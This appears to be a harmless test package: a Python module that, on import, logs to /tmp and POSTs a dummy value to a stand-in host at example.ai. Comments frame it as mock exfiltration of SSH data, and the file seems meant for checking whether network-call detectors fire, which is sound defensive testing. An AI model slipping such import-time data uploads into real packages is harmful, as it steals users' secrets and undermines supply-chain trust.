"""What did you expect? You shouldn't install random libraries, they can contain evil code.
"""

import datetime

try:
    import requests
    HAVE_REQUESTS = True
except:
    # Must handle this case due to the build failing.
    print("NO REQUESTS FOUND!")
    HAVE_REQUESTS = False

# Also, log it in some form.
with open("/tmp/mdni_errors.txt", "a") as fp:
    fp.write(f"{datetime.datetime.now()} -> {HAVE_REQUESTS=}\n")

if HAVE_REQUESTS:
    # Let's "maliciously" "exfiltrate" some "private data"!
    # This package exercises *only* the network connection part.
    # Let's say this was read from `~/.ssh/` or something:
    private_data = 42
    # I hope the people at example.ai don't mind too much; let's pretend this is where we send the gathered data.
    # example.ai is hosted on Google servers, the tiny amount of extra traffic shouldn't be too bad.
    # However, I hope this proves that I'm not actually trying to exfiltrate anything here, just checking whether network connections are detected.
    exfiltration_url = 'https://www.example.ai/?discard=yes&silly=very'
    print("EXFILTRATING!")
    requests.post(exfiltration_url, data=dict(totally_private_data=42))


IS_MALICIOUS = True


# Have a cookie I guess?

class Cookie:
    pass

def make_cookies():
    while True:
        yield Cookie()
